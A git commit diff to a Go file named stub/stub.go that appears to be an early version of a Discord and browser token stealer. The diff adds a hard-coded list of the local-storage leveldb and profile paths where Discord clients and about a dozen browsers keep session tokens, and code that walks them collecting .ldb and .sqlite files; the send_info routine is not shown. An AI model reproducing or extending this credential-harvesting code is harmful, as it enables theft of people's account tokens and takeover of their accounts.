b59a8dd020abdb3e6b88006a6cf20cae80724c05
shiel <shieldscoen@gmail.com>
2022-09-07 22:17:36 -0600

    idk how to use go lol

--- stub/stub.go
+++ stub/stub.go
@@ -1,8 +1,11 @@
 package main
 
 import (
-	"container/list"
+	"fmt"
+	"io/fs"
 	"os"
+	"path/filepath"
+	"strings"
 )
 
 var tokens []string
@@ -22,6 +25,57 @@ func send_info() {
 func start() {
 	appdata, _ := os.UserHomeDir()
 	localappdata, _ := os.UserCacheDir()
-	locations := list.New()
+	locations := []string{}
 
+	// Token locations
+	locations = append(locations, appdata+"\\discord\\Local Storage\\leveldb\\")
+	locations = append(locations, appdata+"\\discordcanary\\Local Storage\\leveldb\\")
+	locations = append(locations, appdata+"\\discordptb\\Local Storage\\leveldb\\")
+	locations = append(locations, appdata+"\\Lightcord\\Local Storage\\leveldb\\")
+	locations = append(locations, appdata+"\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\")
+	locations = append(locations, appdata+"\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\")
+	locations = append(locations, appdata+"\\Mozilla\\Firefox\\Profiles")
+	locations = append(locations, localappdata+"\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\")
+	locations = append(locations, localappdata+"\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\")
+	locations = append(locations, localappdata+"\\Chromium\\User Data\\Default\\Local Storage\\leveldb\\")
+	locations = append(locations, localappdata+"\\Yandex\\YandexBrowser\\User Data\\Default")
+	locations = append(locations, localappdata+"\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\")
+	locations = append(locations, localappdata+"\\BraveSoftware\\Brave-Browser\\User Data\\Default")
+	locations = append(locations, localappdata+"\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\")
+	locations = append(locations, localappdata+"\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\")
+
+	for _, location := range locations {
+		fmt.Println(location)
+
+		if _, err := os.Stat(location); os.IsNotExist(err) {
+			continue
+		}
+		if strings.Contains(location, "Mozilla") {
+			for _, file := range get_files(location, ".sqlite") {
+				fmt.Println(file)
+			}
+		}
+		if strings.Contains(location, "cord") {
+			fmt.Println("test")
+			for _, file := range get_files(location, ".ldb") {
+				fmt.Println(file)
+			}
+		}
+
+	}
+
+}
+
+func get_files(root, ext string) []string {
+	var a []string
+	filepath.WalkDir(root, func(s string, d fs.DirEntry, e error) error {
+		if e != nil {
+			return e
+		}
+		if filepath.Ext(d.Name()) == ext {
+			a = append(a, s)
+		}
+		return nil
+	})
+	return a
 }
